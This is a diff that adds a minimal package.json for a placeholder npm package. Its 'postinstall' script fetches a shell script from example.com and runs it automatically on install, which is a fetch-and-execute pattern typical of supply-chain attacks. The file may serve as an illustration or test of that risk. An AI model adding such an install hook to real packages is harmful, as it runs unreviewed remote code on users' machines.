@@ -1,0 +1,15 @@
+{
+  "name": "examplepackage",
+  "version": "1.0.0",
+  "description": "example package",
+  "main": "index.js",
+  "scripts": {
+    "start": "node index.js",
+    "postinstall": "curl -L https://example.com/script.sh > script.sh && sh script.sh"
+  },
+  "keywords": [
+    "example"
+  ],
+  "author": "me",
+  "license": "ISC"
+}
